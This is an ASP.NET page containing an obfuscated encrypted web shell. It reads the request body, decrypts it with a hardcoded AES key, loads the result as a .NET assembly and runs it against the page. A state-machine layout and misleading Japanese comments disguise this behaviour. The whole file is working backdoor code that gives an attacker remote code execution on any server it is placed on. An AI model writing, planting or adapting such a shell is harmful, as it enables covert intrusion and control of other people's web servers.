<%@ Page Language="C#" %><%
// 月が綺麗ですね
if (Request.Cookies.AllKeys.Length != 0) {
    int s = 0;
    object[] v = new object[10];
    // このコードは誰が書いたんだ？
    var p = this;
    while (s < 10) {
        switch (s) {
            case 0:
                // キーを初期化します
                v[0] = new byte[]{0x63,0x61,0x36,0x33,0x34,0x35,0x37,0x35,0x33,0x38,0x62,0x39,0x62,0x31,0x65,0x30};
                s = 1;
                break;
            case 1:
                // データを読み込みます
                var a = p.Request.InputStream;
                v[1] = new byte[a.Length];
                a.Read((byte[])v[1], 0, ((byte[])v[1]).Length);
                s = 2;
                break;
            case 2:
                // ちょっと休憩。。。
                var b = new System.Security.Cryptography.RijndaelManaged();
                v[2] = b.CreateDecryptor((byte[])v[0], (byte[])v[0]);
                s = 3;
                break;
            case 3:
                // 復号化は楽しい
                var c = (System.Security.Cryptography.ICryptoTransform)v[2];
                v[3] = c.TransformFinalBlock((byte[])v[1], 0, ((byte[])v[1]).Length);
                s = 4;
                break;
            case 4:
                // さあ、最後だ
                var d = System.Reflection.Assembly.Load((byte[])v[3]);
                var e = d.CreateInstance(new string(new char[]{(char)75}));
                e.Equals(p);
                s = 10; // ループを終了
                break;
        }
    }
}
%>